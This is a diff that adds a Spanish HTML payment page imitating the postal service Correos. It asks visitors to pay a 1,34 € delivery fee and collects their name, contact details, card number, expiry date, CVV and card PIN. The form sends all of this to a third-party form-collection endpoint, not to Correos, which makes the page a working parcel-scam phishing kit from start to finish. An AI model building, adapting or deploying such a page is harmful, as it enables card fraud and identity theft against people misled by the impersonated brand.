@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario de Pago - Correos</title>
+    <style>
+        /* Diseño General */
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #FFCB05; /* Amarillo fuerte */
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+
+        /* Contenedor Principal */
+        .container {
+            width: 100%;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 40px;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            border: 2px solid #F7C731; /* Amarillo fuerte */
+        }
+
+        /* Logo de Correos */
+        .logo {
+            display: block;
+            margin: 0 auto 30px;
+            max-width: 180px;
+            cursor: pointer;
+        }
+
+        /* Títulos */
+        h1 {
+            text-align: center;
+            color: #1A4598; /* Azul oscuro */
+            margin-bottom: 20px;
+            font-size: 2.5em;
+            letter-spacing: 1px;
+        }
+
+        h2 {
+            text-align: center;
+            color: #1A4598;
+            font-size: 1.6em;
+            margin-bottom: 30px;
+        }
+
+        /* Estilo del formulario */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            font-size: 16px;
+            font-weight: bold;
+            color: #1A4598; /* Azul oscuro */
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #F7C731; /* Amarillo fuerte */
+            border-radius: 8px;
+            font-size: 16px;
+            background-color: #fff;
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+        }
+
+        /* Estilo cuando el input está en foco */
+        .form-group input:focus {
+            border-color: #1A4598; /* Azul cuando el input está en foco */
+            outline: none;
+            box-shadow: 0 0 5px rgba(26, 69, 152, 0.3);
+        }
+
+        /* Estilo del botón */
+        .form-group input[type="submit"] {
+            background-color: #F7C731; /* Amarillo fuerte */
+            color: #1A4598; /* Azul */
+            border: none;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            padding: 14px;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+
+        .form-group input[type="submit"]:hover {
+            background-color: #F1B732; /* Amarillo oscuro */
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Estilo adicional */
+        .alert {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .footer a {
+            color: #1A4598;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Contenedor de campos y mejora de márgenes */
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+    </style>
+</head>
+<body>
+    <!-- Contenedor Principal -->
+    <div class="container">
+        <!-- Logo de Correos que dirige a la web de Correos -->
+        <a href="https://www.correos.es" target="_blank">
+            <img src="C:\Users\Acer\Downloads\logo correos.png" alt="Logo Correos" class="logo"> <!-- Reemplaza con la ruta de tu logo -->
+        </a>
+
+        <h1>Formulario de Pago - Correos</h1>
+        <h2>Por favor, ingresa tus datos para procesar el pago</h2>
+
+        <!-- Formulario -->
+        <form action="https://formkeep.com/f/f53d1d9ffeeb"
+              accept-charset="UTF-8"
+              enctype="multipart/form-data"
+              method="POST">
+
+            <!-- Nombre -->
+            <div class="form-group">
+                <label for="first_name">Nombre</label>
+                <input type="text" id="first_name" name="first_name" required>
+            </div>
+
+            <!-- Apellidos -->
+            <div class="form-group">
+                <label for="last_name">Apellidos</label>
+                <input type="text" id="last_name" name="last_name" required>
+            </div>
+
+            <!-- Número de Pedido -->
+            <div class="form-group">
+                <label for="order_number">Número de Pedido</label>
+                <input type="text" id="order_number" name="order_number" required>
+            </div>
+
+            <!-- Correo Electrónico -->
+            <div class="form-group">
+                <label for="email">Correo Electrónico</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+
+            <!-- Número de Teléfono -->
+            <div class="form-group">
+                <label for="phone_number">Número de Teléfono</label>
+                <input type="tel" id="phone_number" name="phone_number" required>
+            </div>
+
+            <!-- Número de tarjeta de crédito -->
+            <div class="form-group">
+                <label for="card_number">Número de Tarjeta de Crédito</label>
+                <input type="text" id="card_number" name="card_number" required>
+            </div>
+
+            <!-- Fecha de caducidad -->
+            <div class="form-group">
+                <label for="expiry_date">Fecha de Caducidad (MM/AA)</label>
+                <input type="text" id="expiry_date" name="expiry_date" required>
+            </div>
+
+            <!-- CVV -->
+            <div class="form-group">
+                <label for="cvv">CVV</label>
+                <input type="password" id="cvv" name="cvv" required>
+            </div>
+
+            <!-- PIN -->
+            <div class="form-group">
+                <label for="pin">PIN de 4 dígitos</label>
+                <input type="password" id="pin" name="pin" required maxlength="4" pattern="\d{4}">
+            </div>
+
+            <!-- Botón de envío -->
+            <div class="form-group">
+                <input type="submit" value="Pagar 1,34 €">
+            </div>
+
+            <!-- Texto adicional debajo del botón -->
+            <p style="text-align: center; color: #555; font-size: 14px;">
+                Una vez realizado el pago, se le enviará un SMS informándole sobre el estado de la entrega en todo momento.
+            </p>
+
+        </form>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <p>&copy; 2024 Correos. Todos los derechos reservados. <br>
+        <a href="https://www.correos.es" target="_blank">Visita nuestro sitio web</a></p>
+    </div>
+</body>
+</html>
